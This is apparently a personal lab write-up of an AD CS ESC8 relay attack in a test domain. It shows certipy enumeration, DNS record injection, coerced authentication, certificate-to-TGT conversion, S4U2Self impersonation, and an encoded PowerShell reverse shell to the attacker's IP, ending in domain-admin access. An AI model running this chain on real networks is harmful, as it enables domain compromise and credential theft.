## exploiting ESC8 

The first step is to run the certipy find command to find any ESC vulnerabilies (There are 16 and ESC1 to 8 are the most commun)


```bash
certipy-ad find -dc-ip 192.168.10.10 -u john@lab.local -p 'marioKart1'
```



```json
  {
  "Certificate Authorities": {
    "0": {
      "CA Name": "lab-DC1-CA",
      "DNS Name": "DC1.lab.local",
      "Certificate Subject": "CN=lab-DC1-CA, DC=lab, DC=local",
      "Certificate Serial Number": "5B2B0C45764038A9486CA318566B9A51",
      "Certificate Validity Start": "2025-12-05 19:15:00+00:00",
      "Certificate Validity End": "2030-12-05 19:25:00+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": true
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Permissions": {
        "Owner": "LAB.LOCAL\\Administrators",
        "Access Rights": {
          "256": [
            "LAB.LOCAL\\Authenticated Users"
          ],
          "512": [
            "LAB.LOCAL\\Authenticated Users"
          ],
          "1": [
            "LAB.LOCAL\\Admins du domaine",
            "LAB.LOCAL\\Administrateurs de l\u2019entreprise",
            "LAB.LOCAL\\Administrators"
          ],
          "2": [
            "LAB.LOCAL\\Admins du domaine",
            "LAB.LOCAL\\Administrateurs de l\u2019entreprise",
            "LAB.LOCAL\\Administrators"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC8": "Web Enrollment is enabled over HTTP."
      }
    }
  }
```
The domains is vulnerable to **ESC8**


How will this attacks works:
1)

I need to coerce a computer (the dc or a domain joined clinet) to me then I need to relay the authentification to the vulnerable AD CS HTTP web enrollment Endpoint, then I can get a .pfx certificate file. I can then use this file to auth as this user.


I add a dns record that point to my ip, without it the domain computers / client computers wouldnt want to auth to me since it would be an untrusted ip:

```bash
python3 dnstool.py -u 'LAB\john' -p 'marioKart1' --action add --record kali.lab.local --data 192.168.10.11 --type A 192.168.10.10
```

I run the listener:
```bash
certipy-ad relay \
    -target 'http://DC1.lab.local' -template 'DomainController'
```

I force the Windows 11 client machine to coerce to me using différents technique:

```bash
nxc smb  192.168.10.12 -u 'john' -p 'marioKart1' -M coerce_plus -o LISTENER=kali.lab.local
```
I receive a connexion at my relay then a certificate, I can transform this certificate in a usable .ccache file:

```bash
certipy-ad auth -pfx 'win11e.pfx' -dc-ip 192.168.10.10
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'Win11E.lab.local'
[*]     Security Extension SID: 'S-1-5-21-1336586935-998966762-933632514-1111'
[*] Using principal: 'win11e$@lab.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'win11e.ccache'
File 'win11e.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'win11e.ccache'
[*] Trying to retrieve NT hash for 'win11e$'
[*] Got hash for 'win11e$@lab.local': aad3b435b51404eeaad3b435b51404ee:fdd974c72089d33d65c183c08e59cc3f
```
I will now S4U2Self to become DAdmins on this computer:


impacket-getST -self -impersonate "Administrateur" \
    -altservice "cifs/DC1.lab.local" \
    -altservice "ldap/DC1.lab.local" \
    -altservice "host/DC1.lab.local" \
    -altservice "http/DC1.lab.local"   \
    -k -no-pass -dc-ip 192.168.10.10 \
    -hashes aad3b435b51404eeaad3b435b51404ee:fdd974c72089d33d65c183c08e59cc3f \
    "lab.local/Win11E$"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrateur
[*] Requesting S4U2self
[*] Changing service from Win11E$@LAB.LOCAL to cifs/DC1.lab.local@LAB.LOCAL
[*] Saving ticket in Administrateur@cifs_DC1.lab.local@LAB.LOCAL.ccache

export kRB5CCNAME=Administrateur@cifs_DC1.lab.local@LAB.LOCAL.ccache

Now a simple revshell

nxc smb 192.168.10.12 --use-kcache -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMAAuADEAMQAiACwAOQAwADAAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='

Unfortunately I am only DA on Win11E$ but I just need to: Enter-PSSession -ComputerName DC1 et I am DA.

```bash
PS C:\Temp> Enter-PSSession -ComputerName DC1
Enter-PSSession -ComputerName DC1
[DC1]: PS C:\Users\Administrateur\Documents> whoami
whoami
lab\administrateur
[DC1]: PS C:\Users\Administrateur\Documents> ipconfig
ipconfig

Configuration IP de Windows


Carte Ethernet Ethernet :

   Suffixe DNS propre . la connexion. . . : 
   Adresse IPv6 de liaison locale. . . . .: fe80::fcb0:44:fa5f:4c50%5
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.10.10
   Masque de sous-r,seau. . . .�. . . . . : 255.255.255.0
   Passerelle par d,faut. . . .�. . . . . : 192.168.10.1

Carte Ethernet Ethernet 2 :

   Suffixe DNS propre . la connexion. . . : home
   Adresse IPv6. . . . . . . . . . .�. . .: fd17:625c:f037:3:3b4b:80dc:42db:dcf2
   Adresse IPv6 de liaison locale. . . . .: fe80::845e:7cc:2afe:977f%8
   Adresse IPv4. . . . . . . . . . . . . .: 10.0.3.15
   Masque de sous-r,seau. . . .�. . . . . : 255.255.255.0
   Passerelle par d,faut. . . .�. . . . . : fe80::2%8
                                       10.0.3.2
[DC1]: PS C:\Users\Administrateur\Documents> 

```

You should Read my post about how to exploit your DA permission to create Golden Certificate, one of the most powerfull persistance methods
